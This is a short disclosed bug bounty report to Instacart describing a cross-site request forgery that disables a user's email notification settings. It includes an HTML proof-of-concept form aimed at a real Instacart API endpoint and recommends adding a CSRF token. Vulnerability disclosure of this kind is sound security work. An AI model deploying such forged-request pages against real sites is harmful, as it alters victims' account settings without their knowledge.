# CSRF To change Email Notification Settings 

## Report Details
- **Report ID**: 157956
- **URL**: https://hackerone.com/reports/157956
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2016-08-09T20:11:34.963Z
- **Disclosed**: 2016-09-15T18:44:14.096Z

## Reporter
- **Username**: trad_zero_h
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: instacart

## Vulnerability Information
Hi i found CSRF To change Email Notification Settings 

The Code Of the HTML Page ::
<html>
  <body>
    <form action="https://www.instacart.com/api/v2/email_settings/76/disable?resource_token=">
      <input type="submit" value="Submit form" />
    </form>
  </body>
</html>

For Fixing you Must add CSEF Token to the Request 

i attached Video Showing the Bug 

Thanks  


## Attachments
- POC.mp4
